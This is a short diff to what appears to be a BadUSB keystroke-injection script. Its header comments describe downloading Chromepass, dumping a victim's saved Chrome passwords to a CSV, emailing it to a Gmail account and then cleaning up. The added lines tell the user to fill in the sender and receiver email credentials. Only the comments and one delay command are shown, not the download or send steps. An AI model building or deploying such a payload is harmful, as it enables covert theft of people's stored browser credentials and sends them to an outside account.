@@ -1,6 +1,8 @@
 REM Author: Mountain
 REM: Title - Install Chromepass and send a copy of the csv to gmail account then cleanup
 REM Date: 11/22/21
+REM 
+REM Change all instances of SENDEMAIL, SENDEMAIL PASSWORD, RECEIVEEMAIL
 REM
 REM - Download and start Chromepass
 DELAY 3000
